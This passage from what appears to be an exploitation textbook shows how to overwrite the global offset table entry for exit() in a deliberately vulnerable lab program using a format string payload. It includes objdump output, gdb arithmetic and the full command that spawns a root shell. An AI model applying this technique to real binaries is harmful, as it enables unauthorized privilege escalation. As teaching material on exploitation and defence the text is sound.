# *__Overwriting the Global Offset Table__*

Since a program could use a function in a _shared library_ many times, it’s useful to have a table to reference all the functions. Another special section in compiled programs is used for this purpose, the _procedure linkage table_ (__PLT__).

This section consists of many jump instructions, each one corresponding to the address of a function. It works like a springboard—each time a _shared function_ needs to be called, control will pass through the _PLT_.

An object dump disassembling the _PLT section_ in the vulnerable format string program (_fmt_vuln.c_) shows these jump instructions:

<pre style="color: white;">
reader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln

./fmt_vuln: file format elf32-i386

Disassembly of section .plt:

080482b8 &lt;__gmon_start__@plt-0x10&gt;:
80482b8:        ff 35 6c 97 04 08       pushl 0x804976c
80482be:        ff 25 70 97 04 08       jmp *0x8049770
80482c4:        00 00                   add %al,(%eax)
...

080482c8 &lt;__gmon_start__@plt&gt;:
80482c8:        ff 25 74 97 04 08       jmp *0x8049774
80482ce:        68 00 00 00 00          push $0x0
80482d3:        e9 e0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;

080482d8 &lt;__libc_start_main@plt&gt;:
80482d8:        ff 25 78 97 04 08       jmp *0x8049778
80482de:        68 08 00 00 00          push $0x8
80482e3:        e9 d0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;

080482e8 &lt;strcpy@plt&gt;:
80482e8:        ff 25 7c 97 04 08       jmp *0x804977c
80482ee:        68 10 00 00 00          push $0x10
80482f3:        e9 c0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;

080482f8 &lt;printf@plt&gt;:
80482f8:        ff 25 80 97 04 08       jmp *0x8049780
80482fe:        68 18 00 00 00          push $0x18
8048303:        e9 b0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;

08048308 &lt;exit@plt&gt;:
8048308:        ff 25 84 97 04 08       jmp *0x8049784
804830e:        68 20 00 00 00          push $0x20
8048313:        e9 a0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;

reader@hacking:~/booksrc $
</pre>

One of these jump instructions is associated with the _exit()_ function, which is called at the end of the program. If the jump instruction used for the _exit()_ function can be manipulated to direct the execution flow into shellcode instead of the _exit()_ function, a root shell will be spawned. Below, the procedure linking table is shown to be read only.

<pre style="color: white;">
reader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 "\ .plt\ "
10 .plt         00000060 080482b8 080482b8 000002b8 2**2
                CONTENTS, ALLOC, LOAD, READONLY, CODE
</pre>

But closer examination of the jump instructions (shown in bold below) reveals that they aren’t jumping to addresses but to _pointers to addresses_. For example, the actual address of the _printf()_ function is stored as a pointer at the memory address _0x08049780_, and the _exit()_ function’s address is stored at _0x08049784_.

<pre style="color: white;">
080482f8 &lt;printf@plt&gt;:
80482f8:        ff 25 80 97 04 08       jmp <strong><em>*0x8049780</em></strong>
80482fe:        68 18 00 00 00          push $0x18
8048303:        e9 b0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;

08048308 &lt;exit@plt&gt;:
8048308:        ff 25 84 97 04 08       jmp <strong><em>*0x8049784</em></strong>
804830e:        68 20 00 00 00          push $0x20
8048313:        e9 a0 ff ff ff          jmp 80482b8 &lt;_init+0x18&gt;
</pre>

These addresses exist in another section, called the _global offset table_ (__GOT__), which is writable. These addresses can be directly obtained by displaying the _dynamic relocation entries_ for the binary by using `objdump`.

<pre style="color: white;">
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln: file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET TYPE VALUE
08049764 R_386_GLOB_DAT __gmon_start__
08049774 R_386_JUMP_SLOT __gmon_start__
08049778 R_386_JUMP_SLOT __libc_start_main
0804977c R_386_JUMP_SLOT strcpy
08049780 R_386_JUMP_SLOT printf
<strong><em>08049784 R_386_JUMP_SLOT exit</em></strong>

reader@hacking:~/booksrc $
</pre>

This reveals that the address of the _exit()_ function (shown in bold above) is located in the __GOT__ at _0x08049784_. If the address of the shellcode is overwritten at this location, the program should call the shellcode when it thinks it’s calling the _exit()_ function.

As usual, the shellcode is put in an environment variable, its actual location is predicted, and the format string vulnerability is used to write the value. Actually, the shellcode should still be located in the environment from before, meaning that the only things that need adjustment are the first _16_ bytes of the format string. The calculations for the __%x__ format parameters will be done once again for clarity. In the output below, the address of the shellcode __(#1)__ is written into the address of the exit() function __(#2)__.

<pre style="color: white;">
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at #1 0xbffff9ec
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9ec - 0xbfff
$2 = 14829
(gdb) quit
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln: file format elf32-i386

DYNAMIC RELOCATION RECORDS
   OFFSET     TYPE              VALUE
   08049764   R_386_GLOB_DAT    __gmon_start__
   08049774   R_386_JUMP_SLOT   __gmon_start__
   08049778   R_386_JUMP_SLOT   __libc_start_main
   0804977c   R_386_JUMP_SLOT   strcpy
   08049780   R_386_JUMP_SLOT   printf
#2 08049784   R_386_JUMP_SLOT   exit

reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x86\x97\x04\x08\x84\x97\x04\
x08")%49143x%4\$hn%14829x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%14829x%5$hn
The wrong way to print user-controlled input:
????
b7fe75fc
[*] test_val @ 0x08049794 = -72 0xffffffb8

sh-3.2# whoami
root
sh-3.2#
</pre>

When _fmt_vuln.c_ tries to call the _exit()_ function, the address of the _exit()_ function is looked up in the __GOT__ and is jumped to via the __PLT__. Since the actual address has been switched with the address for the shellcode in the environment, a root shell is spawned.

Another advantage of overwriting the _GOT_ is that the _GOT entries_ are fixed per binary, so a different system with the same binary will have the same _GOT entry_ at the same address.

The ability to overwrite any arbitrary address opens up many possibilities for exploitation. Basically, any section of memory that is writable and contains an address that directs the flow of program execution can be targeted.